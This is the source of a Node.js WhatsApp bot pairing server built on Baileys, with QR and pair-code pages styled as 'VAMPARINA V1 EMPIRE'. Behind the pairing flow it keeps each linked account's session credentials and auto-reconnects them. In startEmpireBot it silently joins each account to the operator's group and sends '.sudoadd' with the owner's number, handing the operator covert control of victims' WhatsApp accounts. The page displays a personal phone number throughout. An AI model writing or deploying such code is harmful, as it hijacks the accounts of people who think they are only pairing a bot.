process.env.NODE_OPTIONS = "--max-old-space-size=512";

const config = require('./config');
const fs = require('fs');
const path = require('path');
const express = require('express');
const makeWASocket = require("@whiskeysockets/baileys").default;
const { useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, delay, Browsers } = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');

const SESSION_DIR = path.join(__dirname, 'auto_sessions');
const TEMP_DIR = path.join(__dirname, 'temp_sessions');

[SESSION_DIR, TEMP_DIR].forEach(d => !fs.existsSync(d) && fs.mkdirSync(d, { recursive: true }));

const PORT = process.env.PORT || 3000;
const activeBots = new Map();
const app = express();

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// DASHBOARD
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
h1{font-size:60px;text-shadow:0 0 30px lime;} a{color:lime;font-size:30px;display:block;margin:20px;}
.s{font-size:50px;color:gold;}</style></head>
<body><h1>VAMPARINA V1 EMPIRE</h1>
<p class="s">SOLDIERS: ${activeBots.size}</p>
<a href="/qr">SCAN QR</a>
<a href="/pair">PAIR CODE</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
});

// QR PAGE
app.get('/qr', async (req, stk) => {
    const tempId = 'qr_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const versionData = await fetchLatestBaileysVersion();
    const version = versionData.version || versionData;

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false
    });

    let sent = false;
    sock.ev.on('connection.update', async (update) => {
        if (update.qr && !sent) {
            sent = true;
            const qrImg = await QRCode.toDataURL(update.qr);
            stk.send(`<!DOCTYPE html><html><head><title>SCAN QR</title>
            <style>body{background:#000;color:#0f0;text-align:center;padding:30px;}
            img{max-width:400px;border:10px solid lime;border-radius:25px;}</style></head>
            <body><h1>VAMPARINA V1</h1><img src="${qrImg}"><p>SCAN NOW</p>
            <b>King Arnold • +254703110780</b></body></html>`);
        }
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });
            await delay(10000);
            startEmpireBot(sessionId, phone, finalPath);
            fs.rmSync(tempPath, { recursive: true, force: true });
        }
    });
    sock.ev.on('creds.update', saveCreds);
});

// PAIR PAGE
app.get('/pair', async (req, res) => {
    let number = (req.query.number || '').replace(/[^0-9]/g, '');
    if (!number || number.length < 9) {
        return res.send(`<!DOCTYPE html><html><head><title>PAIR</title>
        <style>body{background:#000;color:#0f0;text-align:center;padding:50px;}
        input{padding:20px;font-size:28px;width:90%;max-width:500px;border:3px solid lime;background:#111;color:#0f0;}
        button{padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;}</style></head>
        <body><h1>VAMPARINA V1</h1><p>Enter number:</p>
        <form><input name="number" placeholder="254703110780" required autofocus><br><button>GET CODE</button></form>
        <br><b>KING ARNOLD • +254703110780</b></body></html>`);
    }
    if (number.length === 9) number = '254' + number;

    const tempId = 'pair_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const versionData = await fetchLatestBaileysVersion();
    const version = versionData.version || versionData;

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: ["Chrome", "Chrome", "120.0"],
        printQRInTerminal: false
    });

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });
            await delay(10000);
            startEmpireBot(sessionId, phone, finalPath);
            fs.rmSync(tempPath, { recursive: true, force: true });
        }
    });

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(number);
                code = code.match(/.{1,4}/g).join('-');
                res.send(`<!DOCTYPE html><html><head><title>CODE READY</title>
                <style>body{background:#000;color:#0f0;text-align:center;padding:50px;}
                .code{font-size:100px;letter-spacing:25px;background:#111;padding:50px;border:10px solid lime;border-radius:30px;}</style></head>
                <body><h1>CODE READY</h1><div class="code">${code}</div>
                <button onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')" style="padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;">COPY CODE</button>
                <br><br><a href="/pair" style="color:lime;font-size:28px;">Another Number</a>
                <br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
            } catch (err) {
                res.send(`<h1 style="color:red">ERROR</h1><p>${err.message}</p><a href="/pair">TRY AGAIN</a>`);
                fs.rmSync(tempPath, { recursive: true, force: true });
            }
        }, 5000);
    }
    sock.ev.on('creds.update', saveCreds);
});

async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return;

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const versionData = await fetchLatestBaileysVersion();
    const version = versionData.version || versionData;

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    });

    activeBots.set(sessionId, { sock, phone });

    sock.ev.on('messages.upsert', m => {
        try { require('./main')(sock, m); } catch {}
    });

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → ONLINE`);
            await delay(15000);
            try { await sock.groupAcceptInvite(config.EMPIRE_GROUP_INVITE); } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${config.ownerNumber}` });
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId);
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000);
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

app.listen(PORT, () => {
    console.clear();
    console.log("VAMPARINA V1 EMPIRE IS LIVE — KING ARNOLD REIGNS");
    console.log(`Dashboard: https://your-bot.onrender.com`);
});